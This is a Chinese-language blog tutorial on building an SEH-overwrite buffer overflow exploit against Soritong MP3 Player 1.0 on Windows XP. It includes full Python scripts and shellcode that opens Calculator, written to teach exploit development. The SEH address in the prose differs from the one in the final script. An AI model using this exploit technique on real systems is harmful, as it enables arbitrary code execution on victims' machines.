title: exploit编写教程2：跳转到shellcode
date: 2015-12-16 10:23:48
tags: exploit编写
---

这个是基于SEH的exploit，SEH的原理大家去搜索，网上有很多资料，本文就不赘述了。
<!-- more -->

# 试验环境
- 测试平台： Microsoft Windows XP SP3
- 漏洞软件：[Soritong MP3 player 1.0](http://terenceli.github.io/assets/file/seh-exploit/soritong10.exe
)
- 分析工具：Immunity Debugger
- 漏洞描述：通过创建一个畸形皮肤文件将触发Soritong MP3 player 1.0溢出。

#漏洞触发
用python创建一个ui.txt文件并放到skin\default文件夹下面
```
#!/usr/bin/python
filename = "ui.txt"
junk = 'A' * 5000
f = open(filename,'w')
f.write(junk)
f.close()
```
打开Soritong，可以看到程序闪退。
使用Immunity Debugger加载Soritong，F9运行，然后查看SEH链（view -> SEH chain），发现next SEH和SEH handler都被 A 覆盖了
![](http://ww4.sinaimg.cn/large/005CA6ZCgw1ez1aw1va0oj307f03pglt.jpg)

当异常发生时，程序会跳转到SEH handler去执行，通过将这个handler的值设置为程序自带模块的一个pop/pop/ret地址，能够实现程序跳转到next seh pointer去，在next seh中需要做的就是跳转到shellcode执行。shellcode的布局大致如下：
```
[junk][next seh][seh][shellcode]
```
next seh是一个跳转到shellcode的指令，seh是一个程序自带模块的p/p/r地址。
这里再解释一下pop pop ret指令的作用，当异常发生的时候，异常分发器创建自己的栈帧，会将EH handler成员压入新创的栈帧中，在EH结构中有一个域是EstablisherFrame。这个域指向异常注册记录(next seh)的地址并被压入栈中，当一个函数被调用的时候被压入的这个值都是位于ESP+8的地方。使用pop pop ret后，就会将next seh的地址放到EIP中。

# 要精确定位 SEH 的偏移地址
需要构造特殊的唯一字符串模型来覆盖缓冲区
Immunity Debugger再次加载Soritong，在命令行窗口输入：
```
!mona create_pattern 5000
```

![](http://ww3.sinaimg.cn/large/005CA6ZCgw1ez1b8xtm4nj30k404ugne.jpg)

从Log data中可知，pattern文件在C:\D\mona-master\output\Soritong\pattern.txt，
提取出生成的5000个字符文件，放入p.txt，并替换ui.txt中的5000个字符。脚本如下：
```
#!/usr/bin/python
filename = "ui.txt"

fp = open("p.txt",'r')
junk = fp.read()

f = open(filename,'w')
f.write(junk)
f.close()
```
将生成的ui.txt覆盖skin\default中的ui.txt
在Immunity Debugger中查看SEH chain：

![](http://ww3.sinaimg.cn/large/005CA6ZCjw1ez1bo95bd0j307f02dmxd.jpg)

nseh 的值为：35744134 ，在命令行输入
```
!mona pattern_offset 35744134
```
查找nseh偏移

![](http://ww4.sinaimg.cn/large/005CA6ZCgw1ez1bq0ehlzj30ef04wwfs.jpg)

nseh的偏移为：584，则seh handler的偏移：584 + 4 =588

此时我们再用如下脚本测试一下位置是否正确：
```
#!/usr/bin/python
filename = "ui.txt"
junk = 'A' * 584
nseh = 'B' * 4
seh = 'C' * 4
data = junk + nseh + seh
f = open(filename,'w')
f.write(data)
f.close()
```

![](http://ww2.sinaimg.cn/large/005CA6ZCgw1ez1c47xmhvj307e032wep.jpg)

# 查找 p/p/r 指令序列
再次加载目标程序，在命令行窗口输入：
```
!mona rop
```
在rop.txt中查找合适的 p/p/r指令地址

![](http://ww1.sinaimg.cn/large/005CA6ZCgw1ez1if82tnaj30el03njsl.jpg)

选用 0x1001dd61 （选地址时，要注意shellcode截断）

# 构造最终的输入文件
一个short jmp机器码是eb，跟上跳转距离，跳过6字节的short jmp机器码为eb 06。所以使用0xeb,0x06,0x90,0x90覆盖 next seh。

最终的shellcode就是

junk:584字节 ‘A’

next seh:”\xeb\x06\x90\x90”

seh:”\x26\x80\x45\x00”

shellcode：完成功能的，随便找了一个弹计算器的

并且在最后加了一些垃圾数据
```
filename = "ui.txt"
junk = "A" * 584
nseh = "\xeb\x06\x90\x90"
seh = "\x61\xdd\x01\x10"
shellcode = ("\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"
"\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x58\x4e\x37"
"\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x48"
"\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48"
"\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c"
"\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x43\x46\x35\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x48"
"\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54"
"\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x31\x4b\x48"
"\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x43"
"\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x53\x45\x38\x42\x4c\x4a\x57"
"\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a"
"\x4b\x58\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x38\x42\x4b"
"\x42\x50\x42\x30\x42\x50\x4b\x58\x4a\x46\x4e\x43\x4f\x35\x41\x53"
"\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37"
"\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x49"
"\x50\x4f\x4c\x58\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x46"
"\x4e\x36\x43\x46\x42\x50\x5a")
junk2="\x90" * 1000;
data = junk + nseh + seh + shellcode + junk2
f = open(filename,'w')
f.write(data)
f.close()
```

运行目标程序，OK！！！！计算器成功弹出来了

![](http://ww1.sinaimg.cn/large/005CA6ZCgw1ez1igyvjt5j30es08gtb2.jpg)

# 参考文献
[exploit编写笔记2——基于SEH的exploit](exploit编写笔记2——基于SEH的exploit)
<https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/>


